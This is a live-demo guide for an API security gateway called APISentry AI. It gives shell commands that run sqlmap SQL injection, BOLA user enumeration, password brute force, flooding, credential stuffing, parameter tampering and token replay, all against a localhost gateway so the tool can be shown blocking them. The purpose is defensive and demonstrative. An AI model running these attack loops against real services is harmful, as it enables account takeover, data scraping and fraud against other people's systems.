# APISentry AI - Live Demo Guide

Every attack below is a real attack technique, run only on our own gateway
(localhost). Watch the dashboard while you run each one. The first few requests
may be ALLOWED, then APISentry BLOCKS them. This is normal: the tool decides
from behavior, not from a single request.

## Start

  ./run.sh
  open http://localhost:8080
  ./reset.sh   (clean start - all numbers become zero)

## 1. SQL Injection (real tool: sqlmap)

sqlmap -u "http://localhost:9000/search?q=test" --batch --level=2 --risk=2

## 2. BOLA

TOKEN=$(curl -s -X POST http://localhost:9000/login -H "Content-Type: application/json" -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
for id in $(seq 1 12); do curl -s -o /dev/null -w "user $id -> %{http_code}\n" "http://localhost:9000/users/$id" -H "Authorization: Bearer $TOKEN"; sleep 0.3; done

## 3. Brute Force

for pw in 123456 password qwerty admin letmein dragon monkey abc123; do curl -s -o /dev/null -w "$pw -> %{http_code}\n" -X POST "http://localhost:9000/login" -H "Content-Type: application/json" -H "X-Forwarded-For: 66.66.66.66" -d "{\"username\":\"admin\",\"password\":\"$pw\"}"; sleep 0.3; done

## 4. API Flooding

for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} " "http://localhost:9000/products" -H "X-Forwarded-For: 77.77.77.77"; done; echo

## 5. Credential Stuffing

for u in admin alice bob user4 user5 user6 user7 user8; do curl -s -o /dev/null -w "$u -> %{http_code}\n" -X POST "http://localhost:9000/login" -H "Content-Type: application/json" -d "{\"username\":\"$u\",\"password\":\"leaked123\"}"; sleep 0.3; done

## 6. Parameter Tampering

TOKEN=$(curl -s -X POST http://localhost:9000/login -H "Content-Type: application/json" -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
for body in '{"product_id":1,"quantity":-5}' '{"product_id":1,"quantity":999999}' '{"product_id":1,"quantity":1,"unit_price":1}'; do curl -s -o /dev/null -w "tamper -> %{http_code}\n" -X POST "http://localhost:9000/order" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "$body"; sleep 0.4; done

## 7. Token Replay

TOKEN=$(curl -s -X POST http://localhost:9000/login -H "Content-Type: application/json" -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
for i in $(seq 1 6); do curl -s -o /dev/null -w "IP 50.0.0.$i -> %{http_code}\n" "http://localhost:9000/products" -H "Authorization: Bearer $TOKEN" -H "X-Forwarded-For: 50.0.0.$i"; sleep 0.3; done

## Show the difference (without APISentry)

sqlmap -u "http://localhost:8000/search?q=test" --batch --level=2 --risk=2
(here requests reach the app - APISentry is what stops them at the edge)

## Stop

  ./stop.sh
